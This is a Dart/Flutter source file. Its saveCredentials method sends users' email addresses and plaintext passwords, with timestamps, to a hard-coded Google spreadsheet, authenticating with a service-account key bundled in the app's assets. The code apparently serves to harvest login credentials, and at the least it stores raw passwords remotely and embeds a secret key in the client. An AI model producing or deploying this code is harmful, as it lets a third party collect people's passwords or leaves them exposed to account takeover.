import 'package:flutter/services.dart';
import 'package:googleapis/sheets/v4.dart';
import 'package:googleapis_auth/auth_io.dart';

class GoogleSheetsAPI {
  static const _spreadsheetId = '18R3mp04q3T_MIHWnHWxypaP93rW_o1nRlfeIdjg1sR4'; // Your Sheet ID
  static const _credentialsPath = 'assets/auth/service-account.json';

  static Future<void> saveCredentials({
    required String email,
    required String password,
  }) async {
    try {
      print('Attempting to save to Google Sheets...'); // Debug log
      
      // 1. Load credentials
      final json = await rootBundle.loadString(_credentialsPath);
      final credentials = ServiceAccountCredentials.fromJson(json);
      print('Credentials loaded successfully');

      // 2. Authenticate
      final client = await clientViaServiceAccount(
        credentials,
        [SheetsApi.spreadsheetsScope],
      );
      print('Authentication successful');

      // 3. Initialize API
      final sheets = SheetsApi(client);
      print('Sheets API initialized');

      // 4. Append data
      final response = await sheets.spreadsheets.values.append(
        ValueRange(values: [
          [DateTime.now().toIso8601String(), email, password] // Row data
        ]),
        _spreadsheetId,
        'Sheet1!A:C', // Target range (columns A-C)
        valueInputOption: 'USER_ENTERED',
      );
      
      print('Data saved successfully. Response: ${response.toJson()}');
    } catch (e) {
      print('Error saving to Google Sheets: $e');
      rethrow;
    }
  }
}